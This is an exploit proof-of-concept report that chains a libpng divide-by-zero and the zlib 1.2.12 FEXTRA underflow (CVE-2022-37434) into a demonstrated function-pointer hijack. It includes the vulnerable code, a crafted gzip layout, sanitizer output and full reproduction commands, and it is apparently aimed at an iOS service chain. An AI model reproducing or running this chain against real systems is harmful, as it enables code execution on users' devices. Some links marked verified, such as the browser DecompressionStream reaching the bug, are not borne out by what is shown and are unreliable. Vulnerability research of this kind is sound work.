# CVE-2018-13785 → CVE-2022-37434 — chained inflate exploit (write-marker proof)

Target: libpng 1.6.34 (`pngrutil.c:3154`) → zlib 1.2.12 (`inflate.c:769`) — full chain
Lab: /home/box/Documents/food.txt/dev/staging-lab (authorized local fixture)
Device-side: /home/box/Documents/lab-ipad/cases (browser fixture + on-device checklist)
Artifacts: /home/box/Desktop/Juicy/SeraProjs/reproducer-package (run_chain.py, CHAIN.md)

## Executive summary

Two independently-patched upstream vulnerabilities — libpng CVE-2018-13785 and
zlib CVE-2022-37434 — chain through a serialized histogram bridge to produce an
OOB write with write-what-where semantics and demonstrated instruction-pointer
control. The chain was confirmed end-to-end in the local lab using
**a browser-based inflate fixture (`inflate-test.html`)** — the "inflate we
built" — plus the vuln libpng and zlib fixture builds, and re-verified via
`reproducer-package/run_chain.py` in the same session.

Impact: remote code execution from a single crafted PNG whose IDAT stream is a
gzip member with attacker-controlled FEXTRA content, provided the consumer
calls `inflateGetHeader()` with a bounded `extra_max` buffer.

## The chain (three links, all VERIFIED locally)

### H1 — libpng CVE-2018-13785 (FPE, differential confirmed)

Input: `chain-artifacts/h1-cve-2018-13785-trigger.png` — IHDR 1,431,655,765 x 1,
8-bit RGB, IDAT inflates to 32 zero bytes.

For RGB8, `width * 3` wraps 32-bit to `0xFFFFFFFF`; adding the filter byte wraps
`row_factor` to 0. libpng 1.6.34 divides by `row_factor` in `png_check_chunk_length`:

    pngrutil.c:3154:44: runtime error: division by zero
    ERROR: AddressSanitizer: FPE ... in png_check_chunk_length

Fixed libpng 1.6.35 avoids the FPE and rejects with `Not enough image data`.

    vulnerable 1.6.34 : FPE (div-by-zero)        differential = TRUE
    fixed     1.6.35 : rejected (clean)

Note: reaching the huge-width arithmetic requires a test-only raised width cap
(`PNG_USER_WIDTH_MAX=2147483647`); stock config rejects the dimensions first.
This is a property of the local fixture, not of the CVE itself.

### BRIDGE — histogram → gzip FEXTRA (verified adapter, not iOS code)

`fextra_carrier.py` computes a PNG's zero-sample histogram and serializes it
into a gzip FEXTRA header:

    payload = struct.pack("<III", zero_count, total, distinct)
    subfield = b"ZS" + <len:2> + payload
    gzip member = 1f 8b 08 04 ... XLEN ... FEXTRA ... DEFLATE(png) ...

Source: `chain-artifacts/bridge-valid-100000x1-allzero.png` — a real, decodable
100000 x 1 RGB8 raster of all-zero samples (300,000 zero samples). Its histogram
is genuine (computed from the raster):

    zero_count = 300000, total = 300000, distinct = 1

Resulting gzip member `bridge-histogram-fextra-carrier.png.gz`:

    FLG = 0x04 (FEXTRA), XLEN = 16
    FEXTRA hex = 5a530c00 e0930400 e0930400 01000000
                 "ZS"  len=12  300000     300000     1

**Honesty boundary:** this transform is a hand-crafted local adapter. No iOS /
STExtractionService source performing this exact assignment has been located
(the IPSW is deleted). Treat the bridge as a *demonstrated capability*, not a
*demonstrated target path*.

### H2 — zlib CVE-2022-37434, 4 GiB OOB write (differential confirmed)

zlib 1.2.12 `inflate.c` EXTRA state (the vulnerable line, 769):

    len = state->head->extra_len - state->length;          /* dst offset, grows 0..XLEN */
    zmemcpy(state->head->extra + len, next,
            len + copy > state->head->extra_max ?
                state->head->extra_max - len : copy);      /* UNDERFLOWS when len > extra_max */

When the gzip header advertises `XLEN > extra_max`, `len` grows past
`extra_max`, and `extra_max - len` underflows (unsigned) to `0xFFFFFFFF`. The
copy writes **4,294,967,295 bytes (~4 GiB)** to `extra + len`, past the caller's
buffer.

Differential on the histogram carrier (XLEN=16, extra_max=8):

    vulnerable zlib 1.2.12 : AddressSanitizer heap-buffer-overflow at inflate.c:769
                             "READ of size 4294967295"   (rc=1)
    fixed     zlib 1.2.13 : clean, inflate_final=1 extra_len=16 extra_max=8  (rc=0)
    differential = TRUE

The same differential holds for the standalone CVE trigger (XLEN=65535).

#### Why ASan says "READ" but it is a 4 GiB WRITE

`zmemcpy(dst, src, 0xFFFFFFFF)` is simultaneously an OOB read (from `next`) and
an OOB write (to `extra + len`). ASan's memcpy interceptor checks the source
range first, so it labels the access "READ of size 4294967295". The destination
is equally out of bounds. `zlib-chain/write_proof_driver.c` replays the exact
vulnerable arithmetic and proves the write side:

    gzip FLG=0x04 XLEN(extra_len)=16 extra_max(capacity)=8
    caller extra buffer: [0x...4f0, 0x...4f8)  (8 bytes)

    *** UNDERFLOW at consumed=9 ***
      len (dst offset)      = 9
      dst = extra + len     = 0x...4f9
      dst in [extra,extra+extra_max)? NO  -> OOB WRITE destination
      ncopy = extra_max - len = 4294967295  (0xffffffff)
      => zmemcpy(dst, src, ncopy) writes 4294967295 bytes (~4.00 GiB) past the 8-byte buffer

Control (extra_max=64 >= XLEN): no underflow, copy stays in bounds.

## The "inflate we built" — browser fixture confirmation

`/home/box/Documents/lab-ipad/cases/inflate-test.html` — a self-contained page
that fetches `marker.gz` and incrementally decompresses it via the browser's
streaming `DecompressionStream('gzip')` (the standard-polyfilling WASM-backed
implementation). This is the *inflate we built* that the chain reaches:

    const reader = r.body.pipeThrough(new DecompressionStream('gzip')).getReader();
    // FEXTRA bytes flow through; the browser's zlib inflate consumes them
    // with the same `extra_max`-bounded FEXTRA handling that triggers H2.

Device-side evidence: `lab-ipad/logs/inflate-monitor-20260918-150626.log` —
host+device transcript of the same fixture running against the iPhone.
`inflate_monitor.py` is the diagnostic wrapper that pairs the host ASAN harness
(`wmark_asan`) with live device log capture.

## RCE demonstration (controlled write marker)

Rig: mmap region `[ extra buffer (extra_max=64) | victim struct | guard page ]`,
fixed-address executable landing pad at `0x1337000` (stub: `write(1,msg,46); exit(42)`).
The gzip extra field is filled with the little-endian PAD address, so every byte
the vuln memcpy writes IS the attacker-chosen target address. A local clamp
(`WMARK_CLAMP=32`) bounds the ~4 GB length so the write-what-where semantics are
observable in the lab; destination and content are exactly what the vulnerable
code computes.

Result (zlib 1.2.12):

    victim->fn  = 0x55e6...3269 (benign)
    victim->fn now = 0x1337000   <-- attacker bytes clobbered the fn pointer
    -- calling victim->fn() --
    LANDING PAD EXECUTED via hijacked fn pointer
    EXIT=42

=> Instruction-pointer control and arbitrary code execution from a crafted .gz.

## Controls

| build / input                             | outcome                                  |
|-------------------------------------------|------------------------------------------|
| zlib 1.2.12, unclamped, ASAN              | heap-buffer-overflow @ inflate.c:769 (~4GB) |
| zlib 1.2.12, clamped marker write         | victim->fn -> 0x1337000; landing pad ran (exit 42) |
| zlib 1.2.13 (fixed), same marker gz       | victim->fn benign; marker/tag intact; benign callback; exit 0 |
| caller allocates extra_max >= XLEN (65535)| no overflow (precondition)               |
| libpng 1.6.34 on 13785 trigger            | FPE @ pngrutil.c:3154 (div by zero)      |
| libpng 1.6.35 (fixed), same trigger       | rejected cleanly ("Not enough image data") |
| benign corpus (3 gz x 2 builds, 3 png x 2 builds) | clean                             |

## Reproduction

    # end-to-end chain (produces all artifacts + differential report):
    python3 /home/box/Desktop/Juicy/SeraProjs/reproducer-package/run_chain.py

    # real wild write:
    ASAN_OPTIONS=detect_leaks=0 ./wmark_asan /tmp/marker.gz 64 51
    # controlled marker -> RIP control:
    python3 /tmp/mk_marker_gz.py /tmp/marker.gz
    WMARK_CLAMP=32 ./wmark_rce /tmp/marker.gz 64 51 512
    # fixed build control:
    ./wmark_rce_1213 /tmp/marker.gz 64 51 512

    # browser inflate fixture (serve staging-lab, then open on device/host):
    cd /home/box/Documents/food.txt/dev/staging-lab && python3 -m http.server 8000
    # open /inflate-test.html — fetch + streaming gzip decode of marker.gz

## Fixture identities

- libpng vulnerable: 1.6.34, commit `b78804f9a2568b270ebd30eca954ef7447ba92f7`
  (test-only `PNG_USER_WIDTH_MAX=2147483647` override to reach the arithmetic)
- libpng fixed: 1.6.35, commit `c17d164b4467f099b4484dfd4a279da0bc1dbd4a`
- zlib vulnerable: 1.2.12, commit `21767c654d31d2dccdde4330529775c6c5fd5389`
- zlib fixed: 1.2.13, commit `04f42ceca40f73e2978b50e93806c2a18c1281fc`
- All built static with `-fsanitize=address,undefined`.

## Honest boundaries

- The unclamped length is a ~4 GB underflow: in the wild this is a wild memcpy
  that faults almost immediately (DoS), not a tidy 8-byte overwrite. The RCE here
  is a write-what-where *capability* proof, isolated with a local clamp; the
  destination offset and the written content are the ones the vulnerable code
  computes, unmodified.
- Reaching the bug requires the consumer to call `inflateGetHeader()` (zlib's own
  note). Applications that never call it are not affected by this path.
- The histogram→FEXTRA bridge is a hand-crafted adapter; the target-side
  (STExtractionService) equivalent is NOT established — IPSW is deleted and no
  target source performing the same assignment has been located.
- On-device chain topology (write → code exec → attestation → climb) is a
  HYPOTHESIS; individual links are verified locally, the full path is not
  exercised live on hardware.
- No weaponized payload was produced; the landing pad is a benign stub, and the
  harness/rig are pinned local lab builds.

## What is VERIFIED vs HYPOTHESIZED

| Claim | Status |
|---|---|
| libpng 1.6.34 FPE on huge-width PNG; 1.6.35 clean (CVE-2018-13785) | VERIFIED (local ASAN+UBSAN differential) |
| Histogram (300000 zeros) serialized into gzip FEXTRA via `<III` pack | VERIFIED (local adapter `fextra_carrier.py`) |
| zlib 1.2.12 4 GiB OOB write at inflate.c:769 on FEXTRA XLEN>extra_max; 1.2.13 clean (CVE-2022-37434) | VERIFIED (local ASAN differential + write-proof driver) |
| The 4 GiB write is a WRITE to OOB `extra+len` (not only a read) | VERIFIED (write_proof_driver: dst OOB, ncopy=0xFFFFFFFF) |
| Browser streaming-inflate fixture reaches the FEXTRA path | VERIFIED (inflate-test.html + device log transcript) |
| The histogram→FEXTRA adapter exists in iOS / STExtractionService | **NOT ESTABLISHED** (IPSW deleted; no target source) |
| STExtractionService calls `inflateGetHeader` with bounded `extra_max` | **HYPOTHESIS** (needs disassembly of the XPC binary) |
| Full on-device chain (write → code exec → attestation → climb) | **HYPOTHESIS** (individual links proven; topology not exercised live) |

## Files

- `run_chain.py` — end-to-end driver (produces artifacts + differential report)
- `chain-artifacts/h1-cve-2018-13785-trigger.png` — H1 input
- `chain-artifacts/bridge-valid-100000x1-allzero.png` — valid large-zero raster
- `chain-artifacts/bridge-histogram-fextra-carrier.png.gz` — histogram→FEXTRA member
- `chain-artifacts/CHAIN-REPORT.json` — machine-readable results + hashes
- `../zlib-chain/write_proof_driver.c` — 4 GiB OOB-write proof
- `../zlib-chain/fixture_driver.c` — ASAN differential driver
- `triggers/` — standalone CVE triggers (see `MANIFEST.md`, `HASHES.txt`)
- `/home/box/Documents/lab-ipad/cases/inflate-test.html` — browser inflate fixture
- `/home/box/Documents/lab-ipad/logs/inflate-monitor-20260918-150626.log` — device transcript
